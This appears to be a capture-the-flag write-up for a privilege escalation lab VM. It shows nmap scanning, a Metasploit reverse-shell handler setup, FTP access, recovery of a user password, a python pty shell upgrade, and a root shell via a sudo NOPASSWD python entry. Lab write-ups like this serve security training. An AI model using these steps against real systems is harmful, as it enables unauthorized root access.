# Privilege Escalation Project

## Overview

In this project, the objective was to obtain root access on a provided virtual machine (VM) without visible IP addresses. The VM image `01-Local1.ova` was used, and no modifications to GRUB or the VM configuration were allowed. The approach involved discovering the VM's IP address, scanning for open ports, identifying running services, and exploiting vulnerabilities to gain root access.

## Prerequisites

- **VirtualBox**: Ensure VirtualBox is installed and configured to run the provided VM.
- **Nmap**: Network scanning tool.
- **Metasploit**: For exploitation (optional, based on findings).
- **Additional Tools**: tcpdump, Wireshark, nikto, OpenVAS, etc. (as needed).

## Setup

### Install the VM

1. Download the VM image: `01-Local1.utm.zip` (for Apple Silicon CPUs).
2. Import the VM into VirtualBox:
   1. Open VirtualBox.
   2. Go to `File > Import Appliance`.
   3. Select the downloaded file and follow the prompts.

### Configure Networking

Ensure the VM is set up with the appropriate network configuration (NAT or Bridged Adapter) to allow for network scanning.

## Steps

### 1. Discover the VM's IP Address

**Network Scan**: Use `nmap` to identify active IP addresses on the network:

```bash
nmap -sP 192.168.1.0/24
```

Advanced Scan: Once you identify possible IP addresses, perform a more detailed scan to confirm the VM's IP address:

```bash
nmap -sP -v <POTENTIAL_IP_ADDRESS>
```

2. Scan for Open Ports and Services

Port Scan: Scan all ports on the identified IP address:

```bash
nmap -sS -p- <IP_OF_THE_VM>
```

Service and Version Detection: Determine the services running and their versions:

```bash
nmap -sV <IP_OF_THE_VM>
```

3. Identify Vulnerabilities

Service Analysis: Based on the services and versions detected, research known vulnerabilities. Use databases like CVE and Exploit-DB to find relevant exploits.

Vulnerability Scanning: Optionally, use vulnerability scanning tools like nikto, OpenVAS, or Nessus for a comprehensive scan.
4. Exploit Vulnerabilities

Exploit Identification: If you find a vulnerable service, you may use tools like Metasploit to exploit it. Here’s an example command to use Metasploit for an exploit:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD <PAYLOAD_TYPE>
set LHOST <YOUR_IP>
set LPORT <YOUR_PORT>
exploit
```

5. Access the VM via FTP

After analyzing the vulnerabilities, I discovered that FTP access was possible.

Steps to Exploit FTP Access (after connexion):

Navigate to /home:

```bash
cd /home
ls -a
```

We found an shrek user and important.txt file.

Read important.txt:

```bash
cat /home/important.txt
```

Result: it tells me to find and run /.runme.sh

Find and Read runme.sh:

```bash
find / -name ".runme.sh" 2>/dev/null
cat /.runme.sh
```

Result: I found an an encrypted string

Decrypt the Password Hash:

Result: youaresmart (and i guess its the password of the user we found "shrek")

### Switch to shrek User:

Upgrade the remote to a full tty:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Switch to shrek user and use : youaresmart as password

Enter the password: youaresmart

Check Sudo Privileges:

```bash
sudo -l
```

Result:

javascript

(root) NOPASSWD: /usr/bin/python3.5

- Use Python to Spawn Root Shell:

Run Python as root:

```bash
sudo /usr/bin/python3.5
```

In the Python shell:

```bash
import os
os.system("/bin/bash")
```

Retrieve the Flag

```bash
cd /root
ls -a
cat /root/root.txt
```

Conclusion

In this project, the process involved discovering the VM's IP address, scanning for open ports, and identifying vulnerabilities. By exploiting the FTP service and using a discovered password hash, I was able to switch users and gain root access. The final flag was retrieved from the root directory.

github.com/dgthegeek